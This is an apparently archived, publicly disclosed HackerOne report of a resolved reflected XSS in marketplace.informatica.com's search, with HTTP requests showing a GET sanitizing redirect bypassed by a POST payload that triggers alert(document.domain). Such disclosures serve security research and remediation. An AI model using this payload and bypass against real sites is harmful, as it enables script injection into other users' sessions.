---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2017-05-22
submitted: 2017-01-20T21:00:43.260Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/informatica|Informatica]]"
reporter: "s_p_q_r"
source: "https://hackerone.com/reports/200034"
title: "[marketplace.informatica.com] Search XSS"
---
# [marketplace.informatica.com] Search XSS

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Informatica | **Disclosed:** 2017-05-22

- Report: [https://hackerone.com/reports/200034](https://hackerone.com/reports/200034)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2017-01-20T21:00:43.260Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The search query parameter is put into Javascript to set the localStorage item:

https://marketplace.informatica.com/search-solr.jspa?q=%foo%

```javascript
localStorage.setItem("searchTerm", "%foo%");
```

Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:

```http
GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
Host: marketplace.informatica.com

HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
```

However it turns out the search param can be successfully submitted via POST — the following request popups an alert:

```http
POST /search-solr.jspa HTTP/1.1
Host: marketplace.informatica.com

q=%22-alert%28document.domain%29-%22
```

**PoC:**

http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9

Tested with latest Firefox and Chrome.

## Timeline

- **Report Filed**
- **2017-01-20** @s_p_q_r: Btw noticed a strange thing: non-encoded quotes are not removed by this redirection:

```http
GET /search-solr.jspa?q=aaa"bbb'ccc<ddd>eee HTTP/1.1
Host: marketplace.informatica.com
```
```http
HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaa"bbbcccdddeee
```

So the https://marketplace.informatica.com/search-solr.jspa?q=aaa"bbbcccdddeee link will break the JS in IE and Edge:

```javascript
localStorage.setItem("searchTerm", "aaa"bbbcccdddeee");
```

Of course the https://marketplace.informatica.com/search-solr.jspa?q="-alert(document.domain)-" XSS attempt will be blocked by the browser here, but better to fix it anyway I think.
- **2017-01-27** @tarantula_hawk: Hello @s_p_q_r 

Thanks for the report. we are verifying the issue. Will keep you posted.
- **Report Triaged**
- **Report Severity Updated**
- **2017-03-06** @tarantula_hawk: @s_p_q_r 

Please confirm the closure.
- **2017-03-20** @s_p_q_r: Hi,

Yep, fixed now, sorry for the delay. Gonna check the others in a while.
- **Report Resolved**
- **Swag Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
